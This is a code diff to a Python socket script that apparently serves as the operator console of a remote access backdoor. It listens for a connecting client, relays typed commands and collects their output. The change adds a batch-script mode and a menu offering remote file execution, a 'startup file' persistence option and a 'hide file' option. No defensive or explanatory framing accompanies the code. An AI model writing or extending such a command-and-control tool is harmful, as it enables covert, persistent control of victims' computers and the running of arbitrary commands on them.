@@ -30,8 +30,9 @@ class Socket:
             self.established = False
             print(f"Lost connection to {self.address}")
             return False
-        if not command.decode()[0:5] == "batch":
-            self.receive_command_output()
+        if "-batch" in command.decode():
+            return
+        self.receive_command_output()
 
     def receive_command_output(self):
         full_msg = b''
@@ -49,10 +50,14 @@ class Socket:
 
 
 connection = Socket()
+print("\nexecute batch: -batch [args] [script(new line = /n)]")
+print("execute file: -e")
+print("startup file -s")
+print("hide file -h")
 while True:
     if not connection.established:
         connection.listen_to_for_client()
-    print("Enter command:")
+    print("\nEnter command:")
     user_input = input("> ")
     connection.send_command(user_input)
 
